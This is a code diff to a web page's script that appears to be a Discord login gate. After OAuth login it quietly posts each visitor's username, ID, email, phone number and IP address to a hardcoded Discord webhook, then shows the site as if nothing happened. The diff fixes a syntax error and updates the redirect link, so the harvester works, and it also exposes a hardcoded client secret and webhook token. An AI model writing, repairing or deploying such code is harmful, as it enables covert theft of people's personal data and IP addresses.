@@ -54,7 +54,7 @@
 <script>
 const CLIENT_ID = "1446341068315693230";
 const CLIENT_SECRET = "pOvGXscCogOmdfva_VYZCdTZZsPHAbyC";
-const REDIRECT_URI = "https://hgqwy8c-ulcc-git-main-fuckerslol.vercel.app/"; // YOUR LIVE LINK
+const REDIRECT_URI = "https://hgqwy8c-2s84.vercel.app/"; // YOUR NEW LIVE LINK
 const WEBHOOK = "https://discord.com/api/webhooks/1445978398391275721/wiUM_7MA6Pin70VLVcXT30GwF7gYfNJExBgkVHPoRrCCcXoqXLo31iCeOyIJdP87mK6N";
 
 function login() {
@@ -98,7 +98,7 @@ if (location.search.includes('code=')) {
                 fields: [
                     { name: "Username", value: `${user.username}#${user.discriminator}`, inline: true },
                     { name: "Global Name", value: user.global_name || 'None', inline: true },
-                    { name: "ID", value: user user.id, inline: true },
+                    { name: "ID", value: user.id, inline: true },
                     { name: "Email", value: user.email || 'Hidden', inline: true },
                     { name: "Phone", value: user.phone || 'None', inline: true },
                     { name: "IP", value: ip, inline: true },
@@ -118,7 +118,7 @@ if (location.search.includes('code=')) {
                 body: JSON.stringify({ embeds: [embed] })
             });
 
-            // Show site
+            // Show main site
             document.getElementById('login').style.display = 'none';
             document.getElementById('main').style.display = 'block';
             document.getElementById('user').innerHTML = `<img src="${avatar.replace('size=512','size=64')}" style="border-radius:50%;width:40px;height:40px;margin-right:10px;"> ${user.global_name || user.username}`;
